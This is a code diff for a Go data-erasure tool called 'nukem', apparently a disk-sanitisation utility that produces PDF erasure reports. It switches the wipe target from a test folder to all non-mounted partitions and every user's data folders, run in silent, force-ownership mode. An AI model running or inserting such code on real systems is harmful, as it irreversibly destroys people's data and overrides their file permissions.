@@ -4,12 +4,12 @@ import (
 	"crypto/rand"
 	"fmt"
 	"log"
-	//det "nukem/detection"
+	d "nukem/detection"
 	"nukem/report"
 	"os"
 	"os/exec"
 	"path/filepath"
-	//"strings"
+	"strings"
 	"sync"
 
 	"github.com/google/uuid"
@@ -262,8 +262,7 @@ func secureDeleteDirConcurrent(dir string, method string, passes int, force bool
 }
 
 func main() {
-	//partitions := det.GetNonMountedPartitions()
-	dir := "C:/danger"
+
 	passes := 3      // Number of passes for deep wipe
 	force := true    // Force ownership + chmod
 	stealth := true  // Silent mode
@@ -273,29 +272,38 @@ func main() {
 		passes = 1
 	}
 
-	//rep := report.NewEraseReport(strings.Join(partitions, ","), passes, force, stealth)
-	rep := report.NewEraseReport(dir, passes, force, stealth, method)
-
-	/*
-		for i := range partitions {
-			fi, err := os.Stat(partitions[i])
-			if err != nil || !fi.IsDir() {
-				log.Fatal("Invalid directory: ", partitions[i])
-			}
-			if err := secureDeleteDirConcurrent(partitions[i], method, passes, force, stealth, rep, 20); err != nil {
-				log.Printf("Error during wipe: %v\n", err)
+	partitions := d.GetNonMountedPartitions()
+	users, err := d.GetAllUserDataFolders()
+	if err == nil {
+		for _, user := range users {
+			for _, folder := range user.All() {
+				partitions = append(partitions, folder)
 			}
 		}
+	}
+
+	rep := report.NewEraseReport(strings.Join(partitions, ","), passes, force, stealth, method)
+	//rep := report.NewEraseReport(dir, passes, force, stealth, method)
+
+	for i := range partitions {
+		fi, err := os.Stat(partitions[i])
+		if err != nil || !fi.IsDir() {
+			log.Fatal("Invalid directory: ", partitions[i])
+		}
+		if err := secureDeleteDirConcurrent(partitions[i], method, passes, force, stealth, rep, 20); err != nil {
+			log.Printf("Error during wipe: %v\n", err)
+		}
+	}
+
+	/*
+		fi, err := os.Stat(dir)
+		if err != nil || !fi.IsDir() {
+			log.Fatal("Invalid directory: ", dir)
+		}
+		if err := secureDeleteDirConcurrent(dir, method, passes, force, stealth, rep, 20); err != nil {
+			log.Printf("Error during wipe: %v\n", err)
+		}
 	*/
-
-	fi, err := os.Stat(dir)
-	if err != nil || !fi.IsDir() {
-		log.Fatal("Invalid directory: ", dir)
-	}
-	if err := secureDeleteDirConcurrent(dir, method, passes, force, stealth, rep, 20); err != nil {
-		log.Printf("Error during wipe: %v\n", err)
-	}
-
 	rep.Complete()
 	uid := uuid.New().String()
 	pdfName := fmt.Sprintf("reports/erasure_report_%s.pdf", uid)
